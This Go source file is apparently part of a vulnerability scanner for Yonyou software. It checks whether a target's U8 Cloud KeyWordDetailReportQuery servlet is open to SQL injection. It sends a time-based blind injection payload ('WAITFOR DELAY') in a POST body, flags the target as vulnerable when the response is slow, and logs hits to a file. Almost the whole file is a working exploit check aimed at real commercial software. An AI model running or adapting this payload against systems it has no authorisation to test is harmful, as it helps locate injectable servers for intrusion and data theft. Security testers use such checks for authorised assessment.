package Scan

import (
	"fmt"
	"fupo_for_yonyou/Utils"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

func KeyWordDetailReportQueryScan(address string, client *http.Client, Red string, Green string, Yellow string, Reset string, Cyan string, currentTime string) {
	const KeyWordDetailReportQuery = "用友 U8 cloud KeyWordDetailReportQuery SQL注入漏洞"
	urls := address + "/servlet/~iufo/nc.itf.iufo.mobilereport.data.KeyWordDetailReportQuery"

	// 记录请求开始时间
	startTime := time.Now()

	// 发送 POST 请求
	response, err := client.Post(urls, "application/x-www-form-urlencoded", strings.NewReader(`{"reportType":"';WAITFOR DELAY '0:0:5'--","usercode":"18701014496","keyword":[{"keywordPk":"1","keywordValue":"1","keywordIndex":1}]}`))
	if err != nil {
		if strings.Contains(err.Error(), "An existing connection was forcibly closed by the remote host") || strings.Contains(err.Error(), "forcibly closed") {
			fmt.Printf("[%s%s%s] [%s-%s] %s 扫描时连接被目标服务器阻断\n", Cyan, currentTime, Reset, Yellow, Reset, KeyWordDetailReportQuery)
		} else {
			fmt.Printf("[%s%s%s] [%s-%s] %s 扫描时连接被重置\n", Cyan, currentTime, Reset, Yellow, Reset, KeyWordDetailReportQuery)
		}
		return
	}
	defer response.Body.Close()

	// 读取响应内容
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		output := fmt.Sprintf("[%s%s%s] [%s-%s] %s 读取响应内容失败: %v", Cyan, currentTime, Reset, Yellow, Reset, KeyWordDetailReportQuery, err)
		fmt.Println(output)
		return
	}

	// 计算请求耗时
	elapsedTime := time.Since(startTime)

	// 检查漏洞是否存在
	if response.StatusCode == http.StatusOK && strings.Contains(string(body), "success") && elapsedTime.Seconds() > 4 {
		result := KeyWordDetailReportQuery + "：" + urls
		output := fmt.Sprintf("[%s%s%s] [%s+%s] 存在%s：%s", Green, currentTime, Reset, Green, Reset, KeyWordDetailReportQuery, urls)
		fmt.Println(output)

		// 保存结果到文件
		timestamp := time.Now().Format("20230712")
		filename := fmt.Sprintf("scan_result_%s.txt", timestamp)
		if err := Utils.SaveResultToFile(result, filename); err != nil {
			output := fmt.Sprintf("[%s%s%s] [%s-%s] %s 保存结果到文件出错: %v", Cyan, currentTime, Reset, Yellow, Reset, KeyWordDetailReportQuery, err)
			fmt.Println(output)
		}
	} else {
		output := fmt.Sprintf("[%s%s%s] [%s-%s] 不存在%s，状态码: %d", Cyan, currentTime, Reset, Yellow, Reset, KeyWordDetailReportQuery, response.StatusCode)
		fmt.Println(output)
	}
}
